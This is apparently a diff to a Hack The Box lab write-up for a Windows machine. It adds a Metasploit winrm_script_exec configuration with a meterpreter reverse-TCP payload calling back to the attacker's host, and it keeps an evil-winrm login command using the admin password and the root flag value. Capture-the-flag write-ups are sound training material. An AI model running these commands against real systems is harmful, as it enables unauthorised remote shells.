@@ -228,7 +228,7 @@ Answer: 5985
 
 **Submit root flag**
 
-This part I did have to look around online as I was unable to get evil-winrm to work for me an looking into that it is apparently a known issue, apparently with openssl, but also could be having to restart the victim box and/or the VPN connection. But it SHOULD be:
+This part I did have to look around online as I was unable to get evil-winrm to work for me. but also could be having to restart the victim box and/or the VPN connection. But it SHOULD be:
 
 Using Evil-WinRM, we will get a shell into the machine and find the file under the users desktop.
 
@@ -236,6 +236,47 @@ Using Evil-WinRM, we will get a shell into the machine and find the file under t
 sudo ruby evil-winrm.rb -i 10.129.95.234 -u administrator -p 'badminton'
 ```
 
-Once we get our shell on the machine, we can find the flag under C:\Users\mike\Desktop\flag.txt.
+or using metasploit, we can use `exploit(windows/winrm/winrm_script_exec` and set the options for our machine, the target machine, the username and password
+
+```
+Module options (exploit/windows/winrm/winrm_script_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
+   FORCE_VBS  false            yes       Force the module to use the VBS CmdStager
+   PASSWORD   badminton        yes       A specific password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:po
+                                         rt][...]
+   RHOSTS     10.129.227.102   yes       The target host(s), see https://github.com/rapid7/me
+                                         tasploit-framework/wiki/Using-Metasploit
+   RPORT      5985             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randoml
+                                         y generated)
+   URI        /wsman           yes       The URI of the WinRM service
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   USERNAME   Administrator    yes       A specific username to authenticate as
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, n
+                                        one)
+   LHOST     10.10.14.38      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+```
+
+Once we get our shell on the machine, we can find the flag under `C:\Users\mike\Desktop\flag.txt`.
 
 Answer: ea81b7afddd03efaa0945333ed147fac
